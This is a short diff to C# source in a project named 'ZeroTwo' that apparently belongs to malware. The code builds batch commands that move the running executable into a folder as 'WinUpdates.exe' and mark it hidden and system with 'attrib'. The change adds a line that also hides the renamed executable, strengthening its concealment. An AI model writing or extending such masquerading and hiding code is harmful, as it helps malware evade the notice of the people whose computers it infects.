@@ -73,7 +73,8 @@ namespace ZeroTwo.src {
             batchCommands += "echo j | mkdir " + "\"" + destFolder + "\"" + "\n";                   
             batchCommands += "echo j | move ";                   
             batchCommands += "\"" + exePath + "\"" + " " + "\"" + destFolder + "\\WinUpdates.exe" + "\"" + "\n";
-            batchCommands += "echo j | attrib +h +s " + "\"" + destFolder + "\"" + "\n";                 
+            batchCommands += "echo j | attrib +h +s " + "\"" + destFolder + "\"" + "\n";
+            batchCommands += "echo j | attrib +h +s " + "\"" + destFolder + "\\" + "WinUpdates.exe" + "\"" + "\n";
             batchCommands += "echo j | del /F /Q " + "\"" + "C:\\tmp02" + "\"";
 
             Directory.CreateDirectory("C:\\tmp02");
